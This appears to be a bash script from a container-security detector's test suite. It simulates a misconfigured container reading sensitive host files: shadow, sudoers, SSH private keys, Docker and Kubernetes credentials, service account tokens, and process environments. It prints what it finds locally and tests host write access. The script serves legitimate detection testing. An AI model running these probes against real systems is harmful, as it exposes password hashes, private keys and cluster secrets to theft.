#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# ATTACK 4 — Sensitive Host Filesystem Access (REAL)
#
# Technique:  A container with host filesystem paths bind-mounted
#             reads sensitive host files: /etc/shadow, /etc/passwd,
#             SSH keys, Kubernetes secrets, Docker configs, and
#             environment variables from host processes.
#
# This is a common misconfiguration where operators mount too much
# of the host filesystem into a container, enabling data exfil.
#
# What the detector should catch:
#   - openat("/etc/shadow")           → sensitive-host-path-open  HIGH
#   - openat("/etc/passwd")           → sensitive-host-path-open  MEDIUM
#   - openat("/root/.ssh/...")        → sensitive-host-path-open  MEDIUM
#   - openat("/var/run/docker.sock")  → docker-socket-open        CRITICAL
#   - openat("/proc/1/environ")      → sensitive-host-path-open  MEDIUM
#   - openat("/var/lib/kubelet/...")  → sensitive-host-path-open  MEDIUM
# ──────────────────────────────────────────────────────────────────
set -e

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  REAL ATTACK 4 — Sensitive Host Filesystem Access       ║"
echo "║  Running INSIDE a container with host paths mounted      ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[INFO]${RESET} PID: $$  UID: $(id -u)  Hostname: $(hostname)"
echo ""

FINDINGS=0
BLOCKED=0

try_read() {
    local label="$1"
    local filepath="$2"
    local show_lines="${3:-3}"

    echo -e "${YELLOW}[PROBE]${RESET} ${label}: ${filepath}"
    if [ -e "$filepath" ]; then
        if [ -r "$filepath" ]; then
            CONTENT=$(head -n "$show_lines" "$filepath" 2>/dev/null)
            if [ -n "$CONTENT" ]; then
                echo -e "${GREEN}[EXFIL]${RESET} Readable! First ${show_lines} lines:"
                echo "$CONTENT" | sed 's/^/    /'
                FINDINGS=$((FINDINGS + 1))
            else
                echo -e "${GREEN}[EXFIL]${RESET} File exists and is readable (empty or binary)"
                FINDINGS=$((FINDINGS + 1))
            fi
        else
            echo -e "${RED}[DENIED]${RESET} Exists but not readable (permission denied)"
            BLOCKED=$((BLOCKED + 1))
        fi
    else
        echo -e "${RED}[NOTFOUND]${RESET} Path does not exist in this container"
        BLOCKED=$((BLOCKED + 1))
    fi
    echo ""
}

# ── Step 1: Credential files ────────────────────────────────────
echo -e "${CYAN}═══ STEP 1: Host Credential Files ═══${RESET}"
echo ""

try_read "Host shadow file (password hashes)" "/hostfs/etc/shadow"
try_read "Host passwd file (user accounts)" "/hostfs/etc/passwd"
try_read "Host sudoers" "/hostfs/etc/sudoers"
try_read "Host SSH authorized keys" "/hostfs/root/.ssh/authorized_keys"
try_read "Host SSH private key (RSA)" "/hostfs/root/.ssh/id_rsa"
try_read "Host SSH private key (ED25519)" "/hostfs/root/.ssh/id_ed25519"

# ── Step 2: System configuration files ──────────────────────────
echo -e "${CYAN}═══ STEP 2: Host System Configuration ═══${RESET}"
echo ""

try_read "Host hostname" "/hostfs/etc/hostname"
try_read "Host resolv.conf (DNS)" "/hostfs/etc/resolv.conf"
try_read "Host fstab (mount table)" "/hostfs/etc/fstab"
try_read "Host crontab" "/hostfs/etc/crontab"
try_read "Host environment" "/hostfs/etc/environment"

# ── Step 3: Docker / container runtime secrets ──────────────────
echo -e "${CYAN}═══ STEP 3: Container Runtime Secrets ═══${RESET}"
echo ""

try_read "Docker daemon config" "/hostfs/etc/docker/daemon.json"
try_read "Docker auth config" "/hostfs/root/.docker/config.json" 5

# Check if docker.sock is accessible
echo -e "${YELLOW}[PROBE]${RESET} Docker socket: /var/run/docker.sock"
if [ -S "/var/run/docker.sock" ]; then
    echo -e "${GREEN}[EXFIL]${RESET} Docker socket is accessible! Full host control possible."
    FINDINGS=$((FINDINGS + 1))
elif [ -S "/hostfs/var/run/docker.sock" ]; then
    echo -e "${GREEN}[EXFIL]${RESET} Docker socket accessible via /hostfs!"
    FINDINGS=$((FINDINGS + 1))
else
    echo -e "${RED}[NOTFOUND]${RESET} Docker socket not mounted"
    BLOCKED=$((BLOCKED + 1))
fi
echo ""

# ── Step 4: Kubernetes secrets ──────────────────────────────────
echo -e "${CYAN}═══ STEP 4: Kubernetes Secrets ═══${RESET}"
echo ""

try_read "kubelet config" "/hostfs/var/lib/kubelet/config.yaml"
try_read "kube admin.conf" "/hostfs/etc/kubernetes/admin.conf"

# Check for service account token inside K8s container
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
    echo -e "${YELLOW}[PROBE]${RESET} Kubernetes service account token"
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 80)
    echo -e "${GREEN}[EXFIL]${RESET} Service account token: ${TOKEN}..."
    FINDINGS=$((FINDINGS + 1))
else
    echo -e "${YELLOW}[PROBE]${RESET} K8s service account token: not running in K8s"
fi
echo ""

# ── Step 5: Process environment exfiltration (via /proc) ────────
echo -e "${CYAN}═══ STEP 5: Host Process Environment Variables ═══${RESET}"
echo ""

echo -e "${YELLOW}[PROBE]${RESET} Reading host PID 1 environment via /proc/1/environ"
if [ -r "/proc/1/environ" ]; then
    ENV_VARS=$(tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -10)
    if [ -n "$ENV_VARS" ]; then
        echo -e "${GREEN}[EXFIL]${RESET} Host PID 1 environment variables:"
        echo "$ENV_VARS" | sed 's/^/    /'
        FINDINGS=$((FINDINGS + 1))
    fi
else
    echo -e "${RED}[DENIED]${RESET} Cannot read /proc/1/environ"
    BLOCKED=$((BLOCKED + 1))
fi
echo ""

# Try reading cmdline of host processes
echo -e "${YELLOW}[PROBE]${RESET} Enumerating host process command lines via /proc"
HOST_PROCS=0
for pid_dir in /proc/[0-9]*; do
    pid=$(basename "$pid_dir")
    if [ -r "$pid_dir/cmdline" ]; then
        CMD=$(tr '\0' ' ' < "$pid_dir/cmdline" 2>/dev/null)
        if [ -n "$CMD" ]; then
            HOST_PROCS=$((HOST_PROCS + 1))
        fi
    fi
done
if [ "$HOST_PROCS" -gt 10 ]; then
    echo -e "${GREEN}[EXFIL]${RESET} Enumerated ${HOST_PROCS} host process command lines"
    FINDINGS=$((FINDINGS + 1))
else
    echo -e "${CYAN}[INFO]${RESET} Only ${HOST_PROCS} processes visible (isolated PID namespace)"
fi
echo ""

# ── Step 6: Write test — can we modify host files? ──────────────
echo -e "${CYAN}═══ STEP 6: Write Access Test ═══${RESET}"
echo ""

WRITE_TEST="/hostfs/tmp/.escape_write_test_$$"
echo -e "${YELLOW}[PROBE]${RESET} Testing write access to host /tmp..."
if echo "escape-test" > "$WRITE_TEST" 2>/dev/null; then
    echo -e "${RED}[CRITICAL]${RESET} HOST FILESYSTEM IS WRITABLE! Wrote to ${WRITE_TEST}"
    rm -f "$WRITE_TEST" 2>/dev/null
    FINDINGS=$((FINDINGS + 1))
else
    echo -e "${GREEN}[SAFE]${RESET} Host filesystem is read-only (good)"
fi
echo ""

# ── Summary ─────────────────────────────────────────────────────
echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║  RESULTS: Sensitive Host Filesystem Access               ║"
echo "╠══════════════════════════════════════════════════════════╣"
printf "║  Files/resources exfiltrated:  %-3d                       ║\n" $FINDINGS
printf "║  Access blocked/not found:     %-3d                       ║\n" $BLOCKED
echo "║                                                          ║"
echo "║  The detector should have fired alerts for:              ║"
echo "║    - sensitive-host-path-open (MEDIUM/HIGH)              ║"
echo "║    - docker-socket-open (CRITICAL) if socket mounted     ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
